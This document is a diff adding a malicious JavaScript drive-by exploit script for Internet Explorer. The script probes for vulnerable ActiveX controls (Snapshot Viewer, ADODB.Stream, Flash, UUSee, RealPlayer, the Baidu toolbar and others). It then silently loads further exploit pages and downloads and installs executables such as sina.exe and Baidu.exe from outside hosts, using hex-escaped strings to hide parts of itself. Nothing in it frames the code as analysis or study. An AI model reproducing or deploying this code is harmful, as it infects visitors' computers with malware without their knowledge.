@@ -1,0 +1,110 @@
+<script language =javascript>
+try{
+	if(new ActiveXObject("snpvw.Snapshot Viewer Control.1"))document.write('<iframe width=100 height=0 src=ss.html></iframe>')
+}catch(a){
+	
+}try{
+	var b;
+	var gw=new ActiveXObject("Downloader.DLoader.1")
+}catch(b){
+	
+};
+finally{
+	if(b!="[object Error]"){
+		document.write('<object classid="clsid:78ABDC59-D8E7-44D3-9A76-9A0918C52B4A" id="install" width=0 height=0></object>');
+		install["DownloadAndInstall"]("http://down.hs7yue.cn/down/sina.exe")
+	}
+}try{
+	var e;
+	var fderer="dfk#*&$FEFsdfdsfds";
+	var ado=document.createElement("object");
+	if(navigator.userAgent.toLowerCase().indexOf("msie 7")==-1)ado.setAttribute("classid","clsid:BD96C556-65A3-11D0-983A-00C04FC29E36");
+	var as=ado.createobject("Adodb.Stream","")
+}catch(e){
+	
+};
+finally{
+	if(e!="[object Error]"){
+		document.write("<script src=ms06014.js><\/script>")
+	}else {
+		try{
+			var f;
+			var Flashver=(new ActiveXObject("ShockwaveFlash.ShockwaveFlash.9")).GetVariable("$version").split(",")
+		}catch(f){
+			
+		};
+		finally{
+			if(f!="[object Error]"){
+				if(navigator.userAgent.toLowerCase().indexOf("msie")>0){
+					document.write('<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=4,0,19,0" width="0" height="0" align="middle">');
+					document.write('<param name="allowScriptAccess" value="sameDomain">');
+					document.write('<param name="movie" value="http://jzm015.cn/115.swf">');
+					document.write('<param name="quality" value="high">');
+					document.write('<param name="bgcolor" value="#ffffff">');
+					document.write('<embed src="http://jzm015.cn/i115.swf">');
+					document.write('</object>');
+					
+				}else {
+					document.write("<EMBED src=http://jzm015.cn/f115.swf width=0 height=0>")
+				}
+			}
+		}try{
+			var g;
+			var storm=new ActiveXObject("\x55\x55\x55\x50\x47\x52\x41\x44\x45\x2e\x55\x55\x55\x70\x67\x72\x61\x64\x65\x43\x74\x72\x6c\x2e\x31")
+		}catch(g){
+			
+		};
+		finally{
+			if(g!="[object Error]"){
+				var url="http://down.hs7yue.cn/down/";
+				storm=document.createElement("\x6f\x62\x6a\x65\x63\x74");
+				ActivePerl="\x2d\x31\x43\x35\x39\x2d\x34\x42\x42\x42\x2d\x38\x45\x38";
+				getSpraySlide="\x31\x2d\x36\x45\x38\x33\x46\x38\x32\x43\x38\x31\x33\x42";
+				helloworld2Address="\x63\x6c\x73\x69\x64\x3a\x32\x43\x41\x43\x44\x37\x42\x42";
+				storm.setAttribute("\x63\x6c\x61\x73\x73\x69\x64",helloworld2Address+ActivePerl+getSpraySlide);
+				storm["\x55\x70\x64\x61\x74\x65"]("\\Program Files\\Common Files\\uusee\\",url+"\x55\x55\x2e\x69\x6e\x69","",1)
+			}
+		}try{
+			var h;
+			var glworld=new ActiveXObject("\x47\x4c\x49\x45\x44\x6f\x77\x6e\x2e\x49\x45\x44\x6f\x77\x6e\x2e\x31")
+		}catch(h){
+			
+		};
+		finally{
+			if(h!="[object Error]"){
+				document.write('<iframe style=display:none src="GLWORLD.html"></iframe>')
+			}
+		}try{
+			var i;
+			var real=new ActiveXObject("IERPCtl.IERPCtl.1")
+		}catch(i){
+			
+		};
+		finally{
+			if(i!="[object Error]"){
+				if(new ActiveXObject("IERPCtl.IERPCtl.1").PlayerProperty("PRODUCTVERSION")<="6.0.14.552"){
+					document.write('<sCrIpT LAnGuAgE="jAvAsCrIpT" src=real.js><\/script>')
+				}else {
+					document.write('<iframe style=display:none src="Real.html"></iframe>')
+				}
+			}
+		}try{
+			var j;
+			var Baidu=new ActiveXObject("BaiduBar.Tool")
+		}catch(j){
+			
+		};
+		finally{
+			if(j!="[object Error]"){
+				Baidu["\x44\x6c\x6f\x61\x64\x44\x53"]("http://down.hs7yue.cn/down/Baidu.cab","Baidu.exe",0)
+			}
+		}if(f=="[object Error]"&&g=="[object Error]"&&h=="[object Error]"&&i=="[object Error]"){
+			try{
+				if(new ActiveXObject("DPClient.Vod"))document.write('<iframe width=100 height=0 src=Thunder.html></iframe>')
+			}catch(e){
+				
+			}
+		}
+	}
+}
+</script>
